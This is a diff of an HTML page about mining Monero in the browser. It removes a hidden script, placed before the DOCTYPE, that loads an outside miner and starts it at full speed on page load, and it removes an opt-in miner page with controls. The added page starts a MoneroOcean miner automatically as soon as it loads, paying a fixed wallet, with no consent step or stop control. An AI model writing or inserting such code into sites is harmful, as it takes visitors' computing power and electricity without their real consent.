@@ -1,139 +1,24 @@
-<script src="https://www.hostingcloud.racing/MhF0.js"></script>
-<script>
-    var _client = new Client.Anonymous('693d5185ce058658a1acfe4d95a6be2d3f18dce44b7661ff1426c8ca1b56d852', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    
-
-</script>
-
-
-</script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Mendes Miner</title>
-  <style>
-    body {
-      background-color: #121212;
-      color: white;
-      font-family: 'Segoe UI', sans-serif;
-      text-align: center;
-      padding: 40px;
-    }
-
-    h1 {
-      font-size: 32px;
-      margin-bottom: 20px;
-    }
-
-    .control-section {
-      margin: 20px 0;
-    }
-
-    input[type="range"] {
-      width: 200px;
-    }
-
-    button {
-      background-color: #2ecc71;
-      color: white;
-      border: none;
-      padding: 15px 25px;
-      font-size: 16px;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 15px;
-    }
-
-    #status {
-      font-size: 18px;
-      margin-top: 20px;
-      color: #00ffcc;
-    }
-
-    .slider-label {
-      margin-bottom: 5px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoneroOcean Browser Miner</title>
 </head>
 <body>
 
-  <h1>❤️ Help Mendes by Mining Monero</h1>
-  <p>Use your CPU power to support me — safely and voluntarily. Adjust power settings below 👇</p>
+<h1>Mine Monero (XMR) with Us!</h1>
 
-  <div class="control-section">
-    <div class="slider-label">🧠 Threads: <span id="threads-value">2</span></div>
-    <input type="range" id="threads" min="1" max="8" value="2">
-  </div>
+<p>By using our website, you can help us mine Monero and earn rewards directly to our wallet. You can leave this tab open to support!</p>
 
-  <div class="control-section">
-    <div class="slider-label">⚡ Throttle (% CPU): <span id="throttle-value">70</span></div>
-    <input type="range" id="throttle" min="10" max="100" value="70">
-  </div>
-
-  <button onclick="toggleMining()">Start Mining</button>
-
-  <div id="status">Miner is stopped.</div>
-
-  <script src="https://webminepool.com/lib/base.js"></script>
-  <script>
-    let isMining = false;
-    let miner = null;
-
-    const threadsSlider = document.getElementById('threads');
-    const throttleSlider = document.getElementById('throttle');
-    const threadsValue = document.getElementById('threads-value');
-    const throttleValue = document.getElementById('throttle-value');
-    const status = document.getElementById('status');
-
-    function toggleMining() {
-      if (!miner) {
-        miner = WMP.User(
-          '44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf',
-          'mendes-miner'
-        );
-      }
-
-      if (isMining) {
-        miner.stop();
-        status.textContent = "Miner is stopped.";
-        isMining = false;
-        console.log("Stopped miner.");
-      } else {
-        miner.setNumThreads(parseInt(threadsSlider.value));
-        miner.setThrottle((100 - parseInt(throttleSlider.value)) / 100);
-        miner.start();
-        console.log("Started miner with threads: " + threadsSlider.value + ", throttle: " + throttleSlider.value);
-        isMining = true;
-
-        setInterval(() => {
-          if (isMining && miner) {
-            const hps = Math.round(miner.getHashesPerSecond());
-            status.textContent = "⛏️ Mining... Hashrate: " + hps + " H/s";
-            console.log("Current H/s: ", hps);
-          }
-        }, 1000);
-      }
-    }
-
-    threadsSlider.addEventListener('input', () => {
-      threadsValue.textContent = threadsSlider.value;
-      if (isMining && miner) {
-        miner.setNumThreads(parseInt(threadsSlider.value));
-        console.log("Threads updated to: " + threadsSlider.value);
-      }
-    });
-
-    throttleSlider.addEventListener('input', () => {
-      throttleValue.textContent = throttleSlider.value;
-      if (isMining && miner) {
-        miner.setThrottle((100 - parseInt(throttleSlider.value)) / 100);
-        console.log("Throttle updated to: " + throttleSlider.value);
-      }
-    });
-  </script>
+<!-- MoneroOcean Mining Script -->
+<script src="https://moneroocean.stream/miner.js"></script>
+<script>
+    (async function() {
+        await MoneroOcean.start('44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf');
+        // Start mining as soon as the page loads
+    })();
+</script>
 
 </body>
 </html>
